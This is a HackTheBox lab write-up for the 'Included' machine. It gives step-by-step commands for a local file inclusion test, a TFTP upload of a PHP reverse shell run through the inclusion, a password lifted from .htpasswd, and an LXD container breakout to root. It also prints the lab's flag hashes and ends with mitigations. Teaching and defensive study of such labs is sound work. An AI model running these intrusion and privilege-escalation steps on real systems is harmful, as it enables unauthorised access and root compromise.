# Included - HackTheBox Writeup

**Date:** April 16, 2026
**OS:** Linux
**IP Address:** 10.129.28.78
**Difficulty:** Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Included**. 

*   **Initial Access:** Achieved by leveraging a Local File Inclusion (LFI) vulnerability in the web application's `?file=` parameter. This was combined with an arbitrary file upload via the UDP/TFTP service (configured with the `-c` option) to upload a PHP reverse shell, which was then executed using the LFI, granting a shell as the `www-data` user.
*   **Privilege Escalation:** During enumeration, credentials for the user `mike` were discovered in a hidden `.htpasswd` file. Sub-sequentially, `mike` was found to be a member of the `lxd` group. Privilege escalation to root was achieved by performing an LXD container breakout, mounting the host's root filesystem inside a privileged container.
*   **Key Learning Points:** 
    * Improperly secured TFTP services can lead to arbitrary file uploads.
    * LFI vulnerabilities can be escalated to RCE by including uploaded or log files.
    * LXD group membership is often equivalent to root access if not correctly restricted.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 80/tcp | HTTP | Apache httpd 2.4.29 | Web application with file parameter |
| 69/udp | TFTP | tftpd-hpa | Configured with `-c` (create) option |

**Nmap Command:**
```bash
nmap -sC -sV -oN nmap/initial 10.129.28.78
# UDP scan for TFTP
sudo nmap -sU -p 69 10.129.28.78
```

## 2.2. Web Enumeration
The webpage automatically redirects to `http://10.129.28.78/?file=home.php`. This pattern often indicates a Local File Inclusion (LFI) vulnerability.

### LFI Verification
Testing with `/etc/passwd` confirmed the vulnerability:
```bash
curl -sL "http://10.129.28.78/index.php?file=/etc/passwd"
# Output shows mike (1000) and tftp (110)
```

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Local File Inclusion (LFI) & Arbitrary File Upload (TFTP)
*   **Vector:** The `?file=` parameter on `index.php` and the TFTP service on port 69.

## 3.2. Exploitation Path
1.  **Payload Delivery:** Since TFTP allows unauthenticated file uploads, a PHP reverse shell (`shell.php`) was uploaded using cURL.
    ```bash
    curl -T shell.php tftp://10.129.28.78/
    ```
2.  **Payload Execution:** The file is uploaded to the TFTP root directory, which is `/var/lib/tftpboot/`. We triggered it via the LFI:
    ```bash
    curl 'http://10.129.28.78/?file=/var/lib/tftpboot/shell.php'
    ```
3.  **Foothold:** Gained a shell as `www-data`. Enumerated the web root and found `.htpasswd`.
    ```bash
    cat /var/www/html/.htpasswd
    # mike:Sheffield19
    ```
4.  **Lateral Movement:** Authenticated as `mike` using `su`.
    ```bash
    su mike
    # Password: Sheffield19
    ```

**User Flag:**
```bash
cat /home/mike/user.txt
# a56ef91d70cfbf2cdb8f454c006935a1
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
*   Checked `groups` for user `mike`: `mike lxd`.
*   Identified membership in the `lxd` group as the primary escalation vector.

## 4.2. Exploitation Path
1.  **Image Preparation:** Transferred a pre-built Alpine image (`incus.tar.xz` and `rootfs.squashfs`) to the target.
2.  **LXD Breakout:**
    ```bash
    lxc image import incus.tar.xz rootfs.squashfs --alias alpine
    lxc init alpine privesc -c security.privileged=true
    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
    lxc start privesc
    lxc exec privesc /bin/sh
    ```
3.  **Flag Capture:** Accessed the host's root directory from within the container.
    ```bash
    cat /mnt/root/root/root.txt
    ```

**Root Flag:**
```bash
cat /root/root.txt
# c693d9c7499d9f572ee375d4c14c7bcf
```

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| mike | Sheffield19 | /var/www/html/.htpasswd |

---

# 6. Recommendations & Mitigation
1.  **Disable Insecure Services:** TFTP should not allow arbitrary uploads and should be restricted to trusted networks.
2.  **Fix LFI:** Implement strict input validation or use a whitelist for files allowed in the `include` statement.
3.  **LXD Security:** Do not add users to the `lxd` group unless they are trusted with root-level access. Use LXD's RBAC features where possible.
